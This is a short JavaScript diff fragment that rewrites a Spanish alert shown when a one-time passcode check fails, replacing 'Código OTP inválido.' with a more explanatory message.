@@ -6,7 +6,7 @@ setTimeout(() =>{
 
         // COMPROBAR ERROR
         if(info.metaInfo.cdin !== ''){
-            alert('Código OTP inválido.');
+            alert('El código ingresado no es válido. Verifica que estés utilizando el más reciente.');
         }
     }catch(err){
         console.log(err);
